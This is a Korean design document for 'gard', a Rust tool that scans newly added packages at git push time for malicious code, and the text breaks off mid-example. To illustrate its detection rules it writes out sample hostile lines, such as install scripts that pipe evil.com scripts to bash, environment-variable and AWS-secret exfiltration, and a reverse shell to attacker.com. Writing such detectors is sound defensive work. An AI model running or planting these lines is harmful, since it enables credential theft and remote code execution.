# gard 🛡️
### AI 시대의 패키지 보안 게이트 — Rust 패키지 상세 기획서

> **패키지명 확정**: `gard`
> **슬로건**: "Sign what you commit. Guard what you ship."

---

## 1. 프로젝트 개요

| 항목 | 내용 |
|------|------|
| **패키지명** | `gard` |
| **언어** | Rust (2021 edition) |
| **배포 형태** | crates.io + GitHub Releases (native binary) + Homebrew |
| **라이선스** | MIT |
| **타겟** | LLM AI 코딩 도구 사용자, 개인 개발자, 오픈소스 기여자, 소규모 팀 |
| **핵심 가치** | "AI가 설치한 패키지가 원격 저장소에 올라가기 전, 악성 여부를 검증한다" |
| **GitHub** | github.com/dewdew/gard |
| **crates.io** | crates.io/crates/gard |

---

## 2. 핵심 철학

```
AI에게 작업을 맡기는 시대,
AI가 설치한 패키지를 믿을 수 있는가?

push 전에 확인한다.
알려진 위협은 DB로, 신규 위협은 나이·규모로, 
그래도 의심스러우면 코드를 직접 열어본다.
```

- **push 전 차단**: 악성 패키지가 원격 저장소에 도달하기 전에 막음
- **3단계 티어 검사**: 빠른 순서로 — OSV → 메타데이터 → 패키지 코드 분석
- **로컬 우선**: 외부 서버로 코드 전송 없음 (API 조회만)
- **낮은 오탐률**: 전체 코드가 아닌 새로 추가된 패키지만 검사
- **LLM 에이전트 대응**: Claude Code / Cursor / Copilot 자동 커밋에도 동작

---

## 3. 실제 사용 방법 (Usage Guide)

### 3.1 설치

```bash
# 방법 A: cargo (Rust 유저)
cargo install gard

# 방법 B: Homebrew (macOS/Linux)
brew install dewdew/tap/gard

# 방법 C: 바이너리 직접 다운로드
curl -sSL https://github.com/dewdew/gard/releases/latest/download/gard-installer.sh | sh
```

### 3.2 프로젝트에 초기화 (1회)

```bash
cd my-project/
gard init
```

실행 결과 — **CI 환경 자동 감지 포함**:
```
  gard  v0.1.0  SIGN · SCAN · PROTECT

  initializing gard v0.1.0 ...
  loading OSV vulnerability database connection ...
  configuring package registry APIs ...
✓ git hooks installed   (pre-commit, post-commit, pre-push)
✓ manifest created      (.gard/manifest.json)
✓ config written        (.gard/config.toml)

  detecting CI environment ...
✓ GitHub Actions detected   (.github/ found)
✓ workflow created          (.github/workflows/gard.yml)
✓ SARIF upload configured   (GitHub Security tab)

🛡️  gard is protecting this repo — local + remote.
```

생성되는 파일:
```
my-project/
├── .gard/
│   ├── config.toml                    # 설정 파일
│   └── manifest.json                  # 서명 매니페스트 (git 커밋 권장)
├── .github/
│   └── workflows/
│       └── gard.yml                   # ← CI 워크플로우 자동 생성
└── .git/hooks/
    ├── pre-commit                     # ← gard 자동 설치 (기존 hook 병합)
    ├── post-commit                    # ← 서명 기록
    └── pre-push                       # ← 패키지 검사 + push 차단
```

#### CI 환경 자동 감지 로직

`gard init` 실행 시 프로젝트 루트를 탐색해 CI 설정 디렉토리를 자동 감지합니다.

| 감지 조건 | 생성 파일 | 비고 |
|----------|----------|------|
| `.github/` 존재 | `.github/workflows/gard.yml` | GitHub Actions |
| `.gitlab-ci.yml` 또는 `.gitlab/` | `.gitlab-ci.yml` 에 job 추가 | GitLab CI |
| `bitbucket-pipelines.yml` 존재 | 파일에 step 추가 | Bitbucket |
| `Jenkinsfile` 존재 | `Jenkinsfile.gard` 생성 | Jenkins |
| 미감지 | 경고 출력 후 로컬 hook만 설치 | 수동 설정 안내 |

```rust
// gard-git/src/ci.rs
pub enum CiProvider {
    GitHubActions,
    GitLabCI,
    Bitbucket,
    Jenkins,
    Unknown,
}

impl CiProvider {
    pub fn detect(repo_root: &Path) -> Self {
        if repo_root.join(".github").exists()                  { return Self::GitHubActions; }
        if repo_root.join(".gitlab-ci.yml").exists()           { return Self::GitLabCI; }
        if repo_root.join("bitbucket-pipelines.yml").exists()  { return Self::Bitbucket; }
        if repo_root.join("Jenkinsfile").exists()              { return Self::Jenkins; }
        Self::Unknown
    }

    pub fn generate_config(&self, repo_root: &Path) -> Result<()> {
        match self {
            Self::GitHubActions => write_github_actions(repo_root),
            Self::GitLabCI      => append_gitlab_job(repo_root),
            Self::Bitbucket     => append_bitbucket_step(repo_root),
            Self::Jenkins       => write_jenkins_file(repo_root),
            Self::Unknown       => Ok(()),
        }
    }
}
```

자동 생성되는 GitHub Actions 워크플로우:

```yaml
# .github/workflows/gard.yml  (gard init 자동 생성)
name: gard

on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
    steps:
      - uses: actions/checkout@v4

      - name: Install gard
        run: cargo install gard --quiet

      - name: Scan packages
        run: gard scan --packages --format sarif > gard.sarif

      - name: Upload to GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: gard.sarif
```

### 3.3 자동 실행 — git push 시

`gard init` 이후 `git push` 시 **자동으로 패키지 검사**가 실행됩니다.

```bash
git push origin main

  gard  checking 3 new packages ...

  lodash@4.17.21      ✅ T1 pass   (OSV clean · 92M weekly downloads)
  axios@1.7.2         ✅ T1 pass   (OSV clean · 48M weekly downloads)
  colo0rs@1.0.0       ⚠️  T2 flag  (등록 2일 · 다운로드 3회)
                      🔍 T3 analyzing package source ...

  colo0rs/package.json
    postinstall: "node -e require('https').get(...)"    🚨
  colo0rs/index.js
    eval(Buffer.from(payload, 'base64').toString())     🚨
    fetch('http://c2.evil.com/' + process.env.keys())  🚨

  🚨 BLOCK  colo0rs@1.0.0  (3 critical patterns in package source)
  push rejected.
  💡 run `gard explain colo0rs` for details
     run `gard allow colo0rs` to override (not recommended)
```

위협 없을 때:
```bash
git push origin main

  gard  checking 2 new packages ...
✓ express@4.18.2    T1 pass  (OSV clean · 30M weekly downloads)
✓ dayjs@1.11.10     T1 pass  (OSV clean · 15M weekly downloads)
✍  manifest updated → .gard/manifest.json
  push allowed.
```

낮은 다운로드 수만 있을 때 (경고, 차단 아님):
```bash
  some-niche-tool@0.1.2  ⚠️  T2 warn  (등록 15일 · 87회 다운로드)
                              T3 pass  (package source clean)
  → push allowed with warning
  → run `gard allow some-niche-tool` to suppress future warnings
```

### 3.4 주요 명령어

```bash
# 새로 추가된 패키지 수동 검사
gard scan --packages

# 특정 패키지 검사
gard check lodash@4.17.21

# 특정 패키지 상세 설명
gard explain colo0rs

# 경고 패키지 허용 등록 (신뢰하는 경우)
gard allow some-niche-tool

# 허용 목록 확인
gard allowlist

# 서명 무결성 검증
gard verify

# git hooks 제거
gard uninstall

# JSON 출력 (CI 파이프라인용)
gard scan --packages --format json > gard-report.json

# SARIF 출력 (GitHub Security 탭 연동)
gard scan --packages --format sarif > gard.sarif
```

### 3.5 기존 hook이 있을 때 병합 처리

```bash
$ gard init
⚠️  existing pre-push hook detected
✓ merged gard into existing hook (backed up → .git/hooks/pre-push.bak)
```

생성되는 병합 hook:
```sh
#!/bin/sh
# --- gard (auto-injected) ---
gard scan --packages --staged --quiet
if [ $? -ne 0 ]; then exit 1; fi
# --- original hook ---
npm run pre-push-checks
```

---

## 4. 3단계 티어 탐지 시스템

gard의 핵심 탐지 엔진. 빠른 검사부터 순서대로 실행하며,
의심스러울 때만 더 깊이 파고드는 구조입니다.

```
새로 추가된 패키지 감지 (manifest diff)
              ↓
  ┌──────────────────────┐
  │  Tier 1: OSV 조회    │  ← 모든 패키지, ~100ms
  │  알려진 취약점 DB     │
  └──────────┬───────────┘
              │ 통과
  ┌──────────▼───────────┐
  │  Tier 2: 메타데이터  │  ← 모든 패키지, ~200ms
  │  나이 + 다운로드 수  │
  └──────────┬───────────┘
              │ 위험 점수 임계값 초과 시만
  ┌──────────▼───────────┐
  │  Tier 3: 코드 분석   │  ← 의심 패키지만, 1~3s
  │  패키지 소스 직접 검사│
  └──────────────────────┘
              ↓
      PASS / WARN / BLOCK
```

### 4.1 Tier 1 — OSV 데이터베이스 조회

Google이 운영하는 오픈소스 취약점 DB. npm, PyPI, crates.io 전부 커버.

```
API: https://api.osv.dev/v1/query
인증: 불필요 (무료)
응답: 해당 패키지·버전의 알려진 취약점 목록
```

```rust
// gard-pkg/src/tier1_osv.rs

#[derive(Deserialize)]
struct OsvResponse {
    vulns: Option<Vec<OsvVuln>>,
}

pub async fn check(pkg: &Package) -> Tier1Result {
    let body = json!({
        "package": { "name": pkg.name, "ecosystem": pkg.ecosystem() },
        "version": pkg.version,
    });

    let res: OsvResponse = reqwest::Client::new()
        .post("https://api.osv.dev/v1/query")
        .json(&body)
        .send().await?
        .json().await?;

    match res.vulns {
        Some(vulns) if !vulns.is_empty() => Tier1Result::Block {
            reason: format!("{} known vulnerabilities", vulns.len()),
            vulns,
        },
        _ => Tier1Result::Pass,
    }
}
```

| 결과 | 동작 |
|------|------|
| 취약점 있음 | 🚨 즉시 BLOCK |
| 취약점 없음 | Tier 2로 진행 |
| API 오류 | ⚠️ WARN + Tier 2로 진행 |

### 4.2 Tier 2 — 패키지 메타데이터 위험 점수

나이와 다운로드 수를 조합해 신뢰도를 점수화합니다.
각 생태계별로 절대 수치가 다르므로 레지스트리 API를 각각 호출합니다.

```
API (npm):     https://api.npmjs.org/downloads/point/last-week/{pkg}
API (PyPI):    https://pypistats.org/api/packages/{pkg}/recent
API (crates):  https://crates.io/api/v1/crates/{crate}
```

#### 위험 점수 산정 (0~100점)

```
나이 기반
  등록 후 7일 미만    +30점
  등록 후 30일 미만   +15점
  등록 후 90일 미만   +5점

다운로드 수 기반 (생태계별 기준)
  ┌─────────────┬─────────────┬──────────────┐
  │             │ 주간(npm)   │ 월간(PyPI)   │
  ├─────────────┼─────────────┼──────────────┤
  │ +30점       │ < 100       │ < 500        │
  │ +15점       │ < 1,000     │ < 2,000      │
  │ +5점        │ < 10,000    │ < 20,000     │
  │ +0점        │ ≥ 10,000    │ ≥ 20,000     │
  └─────────────┴─────────────┴──────────────┘

다운로드 수 확인 불가 (비공개/삭제)  +20점
```

#### 점수별 동작

```
0~20점   ✅ PASS   → push 허용
21~40점  💛 INFO   → 기록만, push 허용
41~60점  ⚠️  WARN   → 경고 출력, push 허용 (gard allow로 억제 가능)
61~100점 🔍 FLAG   → Tier 3 코드 분석으로 진행
```

Tier 2에서 바로 BLOCK하지 않고 Tier 3로 넘기는 이유:
낮은 다운로드 수 자체가 악성의 증거는 아니기 때문입니다 (소규모 오픈소스 패키지 보호).

### 4.3 Tier 3 — 패키지 소스 코드 분석

Tier 2에서 FLAG된 패키지만 실행. 이미 로컬에 설치된 패키지 코드를 직접 읽어 분석합니다.

```
node_modules/{pkg}/      # npm
site-packages/{pkg}/     # pip
~/.cargo/registry/src/   # cargo
```

#### 검사 항목 1: 설치 스크립트 (최우선)

```json
// package.json 스크립트 검사
{
  "scripts": {
    "postinstall": "node -e \"require('https').get('http://c2.evil.com')\"",
    "preinstall":  "curl http://evil.com/steal.sh | bash"
  }
}
```

설치 시 자동 실행 스크립트에서 네트워크 요청, 쉘 실행이 감지되면 거의 확실한 악성.

```rust
// 검사 대상 스크립트 키
const DANGEROUS_SCRIPTS: &[&str] = &[
    "preinstall", "postinstall",
    "preuninstall", "postuninstall",
    "install",
];
```

#### 검사 항목 2: 소스 코드 고위험 패턴

패키지 소스(.js, .py, .rb 등)에서 아래 조합 패턴을 검사합니다.
개발자 코드와 달리 **유틸리티 패키지에서 이 패턴은 오탐률이 매우 낮습니다.**

```javascript
// 패턴 A: 인코딩 후 즉시 실행
eval(Buffer.from(payload, 'base64').toString())
eval(atob(encodedString))

// 패턴 B: 환경변수 수집 → 외부 전송
const data = Object.entries(process.env)
fetch('https://evil.com', { body: JSON.stringify(data) })

// 패턴 C: 쉘 명령 실행
require('child_process').exec('curl http://c2.com | sh')
subprocess.run(['bash', '-c', 'curl http://evil.com | sh'])

// 패턴 D: 역방향 쉘
require('net').createConnection(4444, 'attacker.com')
```

```python
# setup.py 내 위험 패턴
import urllib.request
urllib.request.urlopen('http://evil.com/steal?key=' + os.environ.get('AWS_SECRET'))
```

#### 검사 항목 3: 난독화 감지

난독화 자체를 위험 신호로 사용합니다.
유틸리티 패키지가 소스를 난독화할 이유가 없기 때문입니다.

```javascript
// 과도한 hex escape
var _0x3f2a=['charAt','charCodeAt'];(function(_0x4b2c){...})

// 변수명 난독화 패턴
var _0x1a2b = function(_0x3c4d, _0x5e6f) { ... }
```

```rust
// gard-pkg/src/tier3_analyzer.rs

pub struct PackageAnalysis {
    pub script_findings: Vec<Finding>,   // postinstall 등 스크립트
    pub source_findings: Vec<Finding>,   // 소스 코드 패턴
    pub obfuscation_score: u8,           // 0~100, 높을수록 의심
}

pub fn analyze(pkg_path: &Path, ecosystem: Ecosystem) -> PackageAnalysis {
    let scripts  = scan_install_scripts(pkg_path, ecosystem);
    let source   = scan_source_files(pkg_path, ecosystem);
    let obfuscation = score_obfuscation(pkg_path);

    PackageAnalysis { script_findings: scripts, source_findings: source, obfuscation_score: obfuscation }
}

fn scan_source_files(pkg_path: &Path, ecosystem: Ecosystem) -> Vec<Finding> {
    // 파일 크기 100KB 초과 또는 미니파이 감지 시 스킵 (성능)
    // → 미니파이 자체를 obfuscation_score에 반영
    walk_source_files(pkg_path, ecosystem)
        .filter(|f| f.size_kb() <= 100 && !is_minified(f))
        .flat_map(|f| apply_patterns(&f))
        .collect()
}
```

#### Tier 3 판정 기준

```
script_findings 에 CRITICAL 패턴     → 🚨 BLOCK
source_findings 에 CRITICAL 패턴 2+  → 🚨 BLOCK
source_findings 에 HIGH 패턴 1+      → ⚠️  WARN
obfuscation_score ≥ 70               → ⚠️  WARN
모두 없음                             → ✅ PASS
```

---

## 5. 터미널 UI 설계 (Aura × Retro)

### 5.1 디자인 컨셉

```
Aura   — 살아있는 글로우 워드마크, 수치 대시보드, pulse 애니메이션
Retro  — 부팅 시퀀스 타이핑 로그, 커서 깜빡임, 한 줄씩 등장
병합   — 상단: Aura 글로우 워드마크 + 통계 패널
        하단: Retro 터미널 로그 박스 (실시간 스캔 출력)
```

### 5.2 컬러 시스템

| 역할 | 색상 | 용도 |
|------|------|------|
| **Primary** | `#00ff9f` | 워드마크, OK 상태, 커서, 테두리 |
| **Critical** | `#ff4757` | CRITICAL 심각도 |
| **High** | `#ffa502` | HIGH 심각도 |
| **Medium** | `#eccc68` | MEDIUM 심각도 |
| **Muted** | `#1a3a1a` | 로그 텍스트, 보조 정보 |
| **Surface** | `#08080f` | 터미널 배경 |
| **Surface-2** | `#000000` | 로그 박스 내부 |

### 5.3 레이아웃 구조

```
┌─────────────────────────────────────────┐
│ ● ● ●  gard — secure terminal    RESTART│  ← window chrome
├─────────────────────────────────────────┤
│                                         │
│          gard   ← 52px 글로우 워드마크   │  ← AURA: 펄스 글로우
│     SIGN · SCAN · PROTECT               │
│                                         │
│  ┌──────┬──────┬──────┬──────┐          │
│  │  24  │   3  │  47  │   9  │          │  ← AURA: 통계 패널
│  │files │thrts │rules │langs │          │
│  └──────┴──────┴──────┴──────┘          │
│                                         │
│  ┌─────────────────────────────────┐    │
│  │ GARD SECURE TERMINAL · v0.1.0 ● │    │
│  │                                 │    │  ← RETRO: 부팅 로그
│  │ initializing gard v0.1.0 ...    │    │
│  │ ✓ git hook installed            │    │
│  │ ❯ gard scan --packages          │    │
│  │ 🚨 BLOCK colo0rs@1.0.0 ...      │    │
│  │ ❯ █                             │    │  ← 커서 깜빡임
│  └─────────────────────────────────┘    │
└─────────────────────────────────────────┘
```

### 5.4 Rust 구현 의존성

```toml
# 터미널 UI
ratatui = "0.28"           # TUI 레이아웃 프레임워크
crossterm = "0.28"         # 크로스플랫폼 터미널 제어
console = "0.15"           # 컬러/스타일 (간단한 출력용)

# 글로우 효과: ANSI 256color + 밝기 단계로 구현
# 커서 깜빡임: crossterm cursor::Show/Hide + 타이머
# 부팅 시퀀스: tokio::time::sleep + 채널 기반 라인 스트리밍
```

### 5.5 부팅 시퀀스 타이밍

```rust
const BOOT_SEQUENCE: &[BootLine] = &[
    BootLine { delay_ms: 0,    text: "initializing gard v0.1.0 ...",           style: Style::Muted },
    BootLine { delay_ms: 350,  text: "connecting OSV database ...",             style: Style::Muted },
    BootLine { delay_ms: 650,  text: "loading registry API endpoints ...",      style: Style::Muted },
    BootLine { delay_ms: 900,  text: "✓ git hook installed  (pre-push)",        style: Style::Ok    },
    BootLine { delay_ms: 1100, text: "✓ manifest ready      (.gard/)",          style: Style::Ok    },
    // ... 패키지 스캔 결과가 순차적으로 스트리밍됨
];
```

### 5.6 RuntimeContext — 실행 환경별 출력 최적화

```rust
// gard-report/src/terminal.rs
pub fn detect_runtime_context() -> RuntimeContext {
    if std::env::var("CLAUDE_CODE").is_ok()
        || std::env::var("ANTHROPIC_CLAUDE_CODE").is_ok()
    {
        return RuntimeContext::ClaudeCode;   // 미니 헤더 + 배지 강조
    }
    if std::env::var("CURSOR_TRACE_ID").is_ok() {
        return RuntimeContext::Cursor;
    }
    if std::env::var("GITHUB_ACTIONS").is_ok() {
        return RuntimeContext::GitHubActions; // 간결 + exit code
    }
    RuntimeContext::Standard                  // Aura × Retro 풀 UI
}
```

**Claude Code 대화창 내 출력 예시:**
```
[Bash] git push origin main
┌──────────────────────────────────────────┐
│  gard  pre-push                          │
│─────────────────────────────────────────│
│  checking 2 new packages ...            │
│✓ express@4.18.2   T1 pass               │
│✓ dayjs@1.11.10    T1 pass               │
│✍  manifest updated → .gard/            │
└──────────────────────────────────────────┘
```

---

## 6. LLM 도구 자동 커밋 대응

### 6.1 핵심 원리

```
LLM 도구가 어떤 방식으로 push하든
git push 명령을 호출하면
.git/hooks/pre-push 가 반드시 실행된다.
```

### 6.2 도구별 호환성 매트릭스

| LLM 도구 | push 방식 | gard 실행 여부 | 비고 |
|----------|-----------|--------------|------|
| **Claude Code** | `git push` via shell | ✅ 항상 실행 | |
| **GitHub Copilot CLI** | `git push` via shell | ✅ 항상 실행 | |
| **Gemini CLI** | `git push` via shell | ✅ 항상 실행 | |
| **Cursor IDE** | 내장 git 클라이언트 | ✅ 실행 | libgit2 hook 지원 |
| **VS Code Source Control** | libgit2 경유 | ✅ 실행 | |
| **GitHub Web Editor** | 원격 직접 커밋 | ❌ 미실행 | CI로 보완 |
| **GitHub Actions bot** | 원격 커밋 | ❌ 미실행 | CI로 보완 |

### 6.3 보호 레이어 전체 구조

```
로컬 push         →  pre-push hook     (gard init 자동 설치)
원격 push/PR      →  GitHub Actions CI (gard init 자동 생성)
웹 에디터 커밋    →  GitHub Actions CI (push 이벤트로 커버)
Bot/Action 커밋   →  GitHub Actions CI (push 이벤트로 커버)
```

### 6.4 manifest에 AI 도구 기록

```json
{
  "package": "axios@1.7.2",
  "checked_at": "2026-06-09T14:32:00Z",
  "tier1_result": "PASS",
  "tier2_score": 5,
  "tier3_result": "SKIPPED",
  "final": "PASS",
  "ai_tool": "claude-code",
  "ai_model": "claude-sonnet-4",
  "committed_by": "dewdew"
}
```

---

## 7. 아키텍처 설계

### 7.1 Workspace 구조

```
gard/
├── Cargo.toml                    # workspace root
├── README.md
├── CHANGELOG.md
├── .github/
│   └── workflows/
│       ├── ci.yml                # test + lint
│       └── release.yml           # cross-compile + GitHub Release
│
├── crates/
│   ├── gard-cli/                 # 엔트리포인트 (binary)
│   │   └── src/main.rs
│   │
│   ├── gard-pkg/                 # 3단계 패키지 탐지 엔진 (핵심)
│   │   └── src/
│   │       ├── lib.rs
│   │       ├── manifest_diff.rs  # package.json/requirements.txt diff 추출
│   │       ├── tier1_osv.rs      # OSV API 조회
│   │       ├── tier2_meta.rs     # 나이 + 다운로드 수 점수
│   │       ├── tier3_analyzer.rs # 패키지 소스 코드 분석
│   │       └── scorer.rs         # 최종 판정 로직
│   │
│   ├── gard-core/                # 서명 생성/검증
│   │   └── src/
│   │       ├── signature.rs
│   │       └── manifest.rs
│   │
│   ├── gard-git/                 # git hook 통합 + CI 감지
│   │   └── src/
│   │       ├── hook.rs
│   │       ├── diff.rs
│   │       └── ci.rs
│   │
│   └── gard-report/              # 출력 (terminal / json / sarif)
│       └── src/
│           ├── terminal.rs       # Aura × Retro UI
│           ├── json.rs
│           └── sarif.rs
```

### 7.2 데이터 흐름

```
git push 이벤트
      ↓
gard-git: staged 패키지 manifest diff 추출
      ↓
새로 추가된 패키지 목록 → gard-pkg
      ↓
  [Tier 1] gard-pkg::tier1_osv     (병렬 처리)
  [Tier 2] gard-pkg::tier2_meta    (병렬 처리)
      ↓
  FLAG된 패키지만 →
  [Tier 3] gard-pkg::tier3_analyzer (순차 처리)
      ↓
gard-pkg::scorer → PackageVerdict { Pass / Warn / Block }
      ↓
gard-core: manifest.json 업데이트
      ↓
gard-report: 터미널 출력 (RuntimeContext 감지)
      ↓
exit 0 (Pass/Warn) | exit 1 (Block)
```

---

## 8. 설정 파일 (.gard/config.toml)

```toml
[general]
version = "1"
author = "dewdew <yeonju@example.com>"
sign_commits = true

[protection]
pre_push_scan = true            # push 시 패키지 검사
block_on_critical = true        # BLOCK 판정 시 push 차단
block_unsigned_push = false     # 서명 없는 push 차단

[tier2]
# 생태계별 주간 다운로드 경고 임계값
npm_warn_threshold   = 1_000
npm_flag_threshold   = 100
pypi_warn_threshold  = 2_000
pypi_flag_threshold  = 500
cargo_warn_threshold = 500
cargo_flag_threshold = 100

# 패키지 나이 임계값 (일)
flag_if_newer_than_days = 7
warn_if_newer_than_days = 30

[tier3]
max_file_size_kb = 100          # 이 크기 초과 파일은 스킵
skip_minified = true            # 미니파이 파일 스킵 (obfuscation score만 반영)
obfuscation_block_score = 80    # 이 점수 이상이면 BLOCK

[allowlist]
# gard allow 명령으로 추가됨
packages = []

[report]
format = "terminal"             # terminal | json | sarif
show_suggestions = true

[hooks]
pre_commit = false              # 커밋 시에는 실행 안 함 (느릴 수 있음)
post_commit = true              # 서명 기록
pre_push = true                 # push 시 패키지 검사
```

---

## 9. 서명(Signature) 시스템

### 매니페스트 구조 (.gard/manifest.json)

```json
{
  "version": "1",
  "schema": "https://gard.dev/schema/v1",
  "repo": "github.com/dewdew/my-project",
  "packages": [
    {
      "name": "axios",
      "version": "1.7.2",
      "ecosystem": "npm",
      "checked_at": "2026-06-09T14:32:00Z",
      "tier1": { "result": "PASS", "osv_vulns": 0 },
      "tier2": { "result": "PASS", "score": 5, "age_days": 1820, "weekly_downloads": 48000000 },
      "tier3": { "result": "SKIPPED" },
      "final": "PASS",
      "ai_tool": "claude-code",
      "ai_model": "claude-sonnet-4",
      "added_by": "dewdew"
    }
  ]
}
```

---

## 10. 핵심 의존성 (Cargo.toml)

```toml
[workspace.dependencies]

# CLI
clap = { version = "4", features = ["derive"] }

# 터미널 UI
ratatui    = "0.28"
crossterm  = "0.28"
console    = "0.15"
indicatif  = "0.17"

# 비동기 HTTP (OSV API, 레지스트리 API)
tokio   = { version = "1", features = ["full"] }
reqwest = { version = "0.12", features = ["json"] }

# 직렬화
serde      = { version = "1", features = ["derive"] }
serde_json = "1"
toml       = "0.8"

# 암호화/서명
sha2 = "0.10"
hex  = "0.4"

# Git 통합
git2  = "0.18"

# 파일 순회
glob   = "0.3"
ignore = "0.4"         # .gitignore 존중

# 에러 처리
anyhow    = "1"
thiserror = "1"
```

> **Tree-sitter 제거**: 패키지 코드 분석은 고위험 Regex 패턴 매칭으로 충분.
> AST 분석은 오탐률 감소를 위해 Phase 2에서 선택적 추가 검토.

---

## 11. 개발 로드맵

### Phase 1 — MVP (4~6주)
```
목표: 실제로 쓸 수 있는 최소 버전

✅ 기본 CLI (init, scan, check, explain, allow, verify, uninstall)
✅ git pre-push hook 설치 + 기존 hook 병합
✅ gard init CI 환경 자동 감지 + 워크플로우 파일 생성
✅ Tier 1: OSV API 조회
✅ Tier 2: 나이 + 다운로드 수 위험 점수 (npm / PyPI / crates.io)
✅ Tier 3: 패키지 소스 코드 Regex 패턴 분석
  - postinstall 스크립트 검사
  - 고위험 조합 패턴 (eval+decode, env→fetch, exec→shell)
  - 난독화 점수
✅ Aura × Retro 터미널 UI 구현
✅ RuntimeContext 감지 (ClaudeCode / GitHubActions / Standard)
✅ 서명 manifest.json 생성/업데이트
✅ crates.io 배포
```

### Phase 2 — 정밀도 향상 (4~6주)
```
✅ npm / PyPI 외 Maven, RubyGems, Composer 지원 추가
✅ Tier 3에 Tree-sitter AST 분석 옵션 추가 (--deep 플래그)
✅ 난독화 점수 고도화 (엔트로피 분석)
✅ SARIF 출력 + GitHub Actions 공식 Action 배포
✅ ai_tool 메타데이터 자동 기록 (Claude Code / Cursor / Copilot)
✅ Claude Code 대화창 최적화 출력
```

### Phase 3 — 생태계 (상시)
```
✅ Homebrew formula
✅ VSCode Extension (별도 레포)
✅ 한국어/영어 이중 문서
✅ K-Devcon / dewdew.dev 발표
✅ 커뮤니티 패턴 기여 시스템
```

---

## 12. 성공 지표 (6개월)

| 지표 | 목표 |
|------|------|
| GitHub Stars | 500+ |
| crates.io 다운로드 | 5,000+/월 |
| 지원 생태계 | npm / PyPI / crates.io |
| 탐지 티어 | 3단계 완성 |
| 오탐률 | < 3% |
| 평균 검사 시간 | < 2초 (Tier 1+2) |

---

## 13. 경쟁 도구 대비 포지셔닝

| | gard | Socket.dev | npm audit | Snyk |
|--|------|-----------|-----------|------|
| **패키지 소스 분석** | ✅ | ✅ | ❌ | ❌ |
| **OSV 연동** | ✅ | ✅ | ✅ | ✅ |
| **push 차단** | ✅ | ❌ | ❌ | ⚠️ |
| **AI 커밋 추적** | ✅ | ❌ | ❌ | ❌ |
| **init 한 번으로 설정** | ✅ | ❌ | ❌ | ❌ |
| **로컬 전용 (코드 미전송)** | ✅ | ❌ | ✅ | ❌ |
| **무료** | ✅ | ⚠️ | ✅ | ⚠️ |

gard의 핵심 차별점: **"AI가 설치한 패키지를 push 전에, 로컬에서, 한 번의 init으로"**

---

## 14. 로컬 개발 테스트 — 로깅 & 진단 시스템

### 14.1 설계 원칙

```
일반 사용자  →  gard init                (조용한 출력, 결과만)
트러블슈팅   →  gard init -v             (단계별 로그)
기여자/개발  →  gard init -vv            (내부 HTTP, 점수 계산, 파일 경로 전부)
진단         →  gard doctor              (설치 상태 전체 점검)
시뮬레이션   →  gard init --dry-run      (파일 변경 없이 실행 미리보기)
```

### 14.2 전역 Verbosity 플래그

모든 명령어에 붙일 수 있는 전역 옵션:

```bash
gard [command] -v          # verbose  — 단계별 처리 로그
gard [command] -vv         # debug    — HTTP 요청/응답, 점수 계산 세부값
gard [command] -vvv        # trace    — 파일 순회, 패턴 매칭 전체
```

```rust
// gard-cli/src/cli.rs
#[derive(Parser)]
pub struct Cli {
    #[arg(short, long, action = clap::ArgAction::Count, global = true)]
    pub verbose: u8,   // 0=quiet, 1=verbose, 2=debug, 3=trace
    // ...
}

// main.rs — verbosity → tracing level 변환
fn init_tracing(verbose: u8) {
    let level = match verbose {
        0 => tracing::Level::WARN,
        1 => tracing::Level::INFO,
        2 => tracing::Level::DEBUG,
        _ => tracing::Level::TRACE,
    };
    tracing_subscriber::fmt()
        .with_max_level(level)
        .with_target(verbose >= 2)   // -vv부터 모듈 경로 표시
        .init();
}
```

`RUST_LOG` 환경변수도 병행 지원 (개발 빌드 편의):

```bash
RUST_LOG=gard=trace gard scan --packages
RUST_LOG=gard_pkg::tier2_meta=debug gard check lodash@4.17.21
```

#### -v 출력 예시

```
$ gard init -v
[INFO ] detecting git repository root → /Users/dewdew/my-project
[INFO ] CI environment scan ...
[INFO ]   .github/ found → GitHubActions
[INFO ] writing hook → .git/hooks/pre-push
[INFO ] manifest path → .gard/manifest.json
[INFO ] config path   → .gard/config.toml
✓ git hooks installed
✓ manifest created
✓ CI workflow written → .github/workflows/gard.yml
```

#### -vv 출력 예시

```
$ gard scan --packages -vv
[DEBUG] manifest diff: 3 new packages detected
[DEBUG] tier1 OSV POST https://api.osv.dev/v1/query
[DEBUG]   → lodash@4.17.21  200 OK  42ms  vulns: 0
[DEBUG]   → axios@1.7.2     200 OK  38ms  vulns: 0
[DEBUG]   → colo0rs@1.0.0   200 OK  35ms  vulns: 0
[DEBUG] tier2 npm downloads GET https://api.npmjs.org/...
[DEBUG]   → lodash   weekly: 48_203_441  age_days: 3847  score: 0
[DEBUG]   → axios    weekly: 48_019_221  age_days: 4012  score: 0
[DEBUG]   → colo0rs  weekly: 3           age_days: 2     score: 60  → FLAG
[DEBUG] tier3 analyzer: /node_modules/colo0rs/
[DEBUG]   scan file: package.json (2.1 KB)
[DEBUG]   CRITICAL match: postinstall + net request pattern
```

### 14.3 gard doctor — 설치 상태 진단 명령어

```bash
gard doctor
```

git push를 막거나, 동작이 이상할 때 첫 번째 디버깅 명령어. 설치 상태 전체를 점검하고 문제를 출력합니다.

```
$ gard doctor

  gard  v0.1.0  — system diagnostics

  environment
  ✓ git repository         /Users/dewdew/my-project
  ✓ gard config            .gard/config.toml  (v1)
  ✓ gard manifest          .gard/manifest.json  (12 packages)

  git hooks
  ✓ pre-push hook          installed & executable
  ✓ hook content           gard pre-push block present
  ✗ post-commit hook       not installed  → run: gard init

  network connectivity
  ✓ OSV API                api.osv.dev  →  200 OK  (44ms)
  ✓ npm registry           api.npmjs.org  →  200 OK  (61ms)
  ✓ PyPI stats             pypistats.org  →  200 OK  (88ms)
  ✗ crates.io API          crates.io  →  timeout  (>3000ms)
    → tier2 cargo packages will fall back to WARN score

  ecosystem detection (project root)
  ✓ npm                    package.json found
  ✗ Python                 requirements.txt not found
  ✗ Cargo                  Cargo.toml not found

  allowlist
  ℹ 2 packages in allowlist: some-niche-tool, internal-lib

  2 issues found. run `gard doctor -v` for full details.
```

```rust
// gard-cli/src/commands/doctor.rs
pub async fn run(verbose: u8) -> Result<()> {
    check_git_repo(verbose)?;
    check_gard_config(verbose)?;
    check_hooks(verbose)?;
    check_network_connectivity(verbose).await?;
    check_ecosystem_files(verbose)?;
    print_summary()
}
```

### 14.4 --dry-run 플래그

파일을 실제로 쓰지 않고 실행 결과를 미리 보여줍니다. `gard init`과 `gard scan` 지원:

```bash
gard init --dry-run
